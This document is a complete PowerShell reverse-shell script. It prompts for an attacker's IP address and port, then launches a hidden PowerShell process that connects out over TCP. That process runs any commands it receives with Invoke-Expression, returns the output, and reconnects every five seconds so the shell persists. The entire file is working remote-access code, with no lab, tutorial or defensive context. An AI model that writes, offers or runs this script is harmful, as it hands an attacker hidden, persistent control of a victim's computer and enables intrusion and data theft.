# Prompt user for IP address and port
$IPAddress = Read-Host "Enter the IP address"
$Port = Read-Host "Enter the port"

# PowerShell script with connection retry mechanism
$Script = @"
while (\$true) {
    try {
        \$TCPClient = \$null
        \$NetworkStream = \$null
        \$StreamWriter = \$null

        while (\$null -eq \$TCPClient) {
            try {
                \$TCPClient = New-Object Net.Sockets.TCPClient('$IPAddress', $Port)
                \$NetworkStream = \$TCPClient.GetStream()
                \$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream)

                function WriteToStream (\$String) {
                    [byte[]]\$script:Buffer = 0..(\$TCPClient.ReceiveBufferSize - 1) | ForEach-Object { 0 }
                    \$StreamWriter.Write(\$String + 'SHELL> ')
                    \$StreamWriter.Flush()
                }

                WriteToStream ''

                while (\$true) {
                    \$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)
                    if (\$BytesRead -eq 0) { break }

                    \$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead)
                    \$Output = try {
                        Invoke-Expression \$Command 2>&1 | Out-String
                    } catch {
                        \$ErrorMessage = \$_
                        WriteToStream "Error: \$ErrorMessage"
                        continue
                    }

                    WriteToStream \$Output
                }
            } catch {
                \$ErrorMessage = \$_
                Write-Host "Connection failed. Retrying in 5 seconds..."
                Start-Sleep -Seconds 5
                \$TCPClient = \$null
                continue
            } finally {
                # Close the StreamWriter and TCPClient objects if they are open
                if (\$StreamWriter) { \$StreamWriter.Close() }
                if (\$TCPClient) { \$TCPClient.Close() }
            }
        }
    } catch {
        # Handle any global exceptions here
        Write-Host "An unexpected error occurred: \$_"
    }
}
"@

# Execute the script
powershell -Window Hidden -Command $Script
